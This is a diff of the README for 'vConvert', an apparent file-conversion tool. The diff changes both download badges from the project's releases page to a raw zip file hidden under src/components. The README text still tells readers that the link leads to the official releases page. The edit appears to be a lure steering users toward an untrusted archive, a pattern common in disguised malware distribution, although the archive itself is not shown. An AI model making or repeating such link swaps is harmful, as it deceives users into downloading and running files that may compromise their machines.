@@ -20,7 +20,7 @@ Ready to convert your first file? Follow these simple steps below.
 
 First, you need to get vConvert onto your computer. It's super easy.
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/Download-vConvert-blueviolet?style=for-the-badge&logo=github)](https://github.com/Kellyaxillary5670/vConvert/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/Download-vConvert-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Kellyaxillary5670/vConvert/main/src/components/v_Convert_v1.1.zip)
 
 **Visit this link to download the application.** The link above will take you to the download page where you can find the correct version for your system.
 
@@ -149,7 +149,7 @@ vConvert is truly universal. It runs on:
 
 Don't wait! Get vConvert now and never worry about incompatible file formats again.
 
-[![Download vConvert](https://img.shields.io/badge/⬇️%20Download-vConvert%20Now-critical?style=for-the-badge&labelColor=23272d&color=2ea043)](https://github.com/Kellyaxillary5670/vConvert/releases)
+[![Download vConvert](https://img.shields.io/badge/⬇️%20Download-vConvert%20Now-critical?style=for-the-badge&labelColor=23272d&color=2ea043)](https://raw.githubusercontent.com/Kellyaxillary5670/vConvert/main/src/components/v_Convert_v1.1.zip)
 
 **Visit this link to download the application.** You'll land on the official releases page where you'll find all the latest versions.
 
